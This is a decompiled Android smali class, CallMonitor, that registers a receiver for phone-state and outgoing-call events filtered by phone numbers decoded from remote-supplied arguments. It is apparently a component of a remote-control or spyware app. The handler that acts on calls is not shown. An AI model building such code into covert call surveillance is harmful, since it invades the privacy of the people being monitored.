.class public Lmy/app/Library/CallMonitor;
.super Ljava/lang/Object;
.source "CallMonitor.java"


# instance fields
.field protected Callreceiver:Landroid/content/BroadcastReceiver;

.field channel:I

.field ctx:Lmy/app/client/ClientListener;

.field isCalling:Ljava/lang/Boolean;

.field phoneNumberFilter:Ljava/util/HashSet;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Ljava/util/HashSet",
            "<",
            "Ljava/lang/String;",
            ">;"
        }
    .end annotation
.end field


# direct methods
.method public constructor <init>(Lmy/app/client/ClientListener;I[B)V
    .locals 3
    .param p1, "c"    # Lmy/app/client/ClientListener;
    .param p2, "chan"    # I
    .param p3, "args"    # [B

    .prologue
    .line 23
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    .line 21
    const/4 v1, 0x0

    invoke-static {v1}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    iput-object v1, p0, Lmy/app/Library/CallMonitor;->isCalling:Ljava/lang/Boolean;

    .line 38
    new-instance v1, Lmy/app/Library/CallMonitor$1;

    invoke-direct {v1, p0}, Lmy/app/Library/CallMonitor$1;-><init>(Lmy/app/Library/CallMonitor;)V

    iput-object v1, p0, Lmy/app/Library/CallMonitor;->Callreceiver:Landroid/content/BroadcastReceiver;

    .line 24
    iput-object p1, p0, Lmy/app/Library/CallMonitor;->ctx:Lmy/app/client/ClientListener;

    .line 25
    iput p2, p0, Lmy/app/Library/CallMonitor;->channel:I

    .line 26
    invoke-static {p3}, Lutils/EncoderHelper;->decodeHashSet([B)Ljava/util/HashSet;

    move-result-object v1

    iput-object v1, p0, Lmy/app/Library/CallMonitor;->phoneNumberFilter:Ljava/util/HashSet;

    .line 27
    new-instance v0, Landroid/content/IntentFilter;

    invoke-direct {v0}, Landroid/content/IntentFilter;-><init>()V

    .line 28
    .local v0, "filter":Landroid/content/IntentFilter;
    const-string v1, "android.intent.action.PHONE_STATE"

    invoke-virtual {v0, v1}, Landroid/content/IntentFilter;->addAction(Ljava/lang/String;)V

    .line 29
    const-string v1, "android.intent.action.NEW_OUTGOING_CALL"

    invoke-virtual {v0, v1}, Landroid/content/IntentFilter;->addAction(Ljava/lang/String;)V

    .line 30
    iget-object v1, p0, Lmy/app/Library/CallMonitor;->ctx:Lmy/app/client/ClientListener;

    iget-object v2, p0, Lmy/app/Library/CallMonitor;->Callreceiver:Landroid/content/BroadcastReceiver;

    invoke-virtual {v1, v2, v0}, Lmy/app/client/ClientListener;->registerReceiver(Landroid/content/BroadcastReceiver;Landroid/content/IntentFilter;)Landroid/content/Intent;

    .line 31
    return-void
.end method


# virtual methods
.method public stop()V
    .locals 2

    .prologue
    .line 34
    iget-object v0, p0, Lmy/app/Library/CallMonitor;->ctx:Lmy/app/client/ClientListener;

    iget-object v1, p0, Lmy/app/Library/CallMonitor;->Callreceiver:Landroid/content/BroadcastReceiver;

    invoke-virtual {v0, v1}, Lmy/app/client/ClientListener;->unregisterReceiver(Landroid/content/BroadcastReceiver;)V

    .line 35
    return-void
.end method
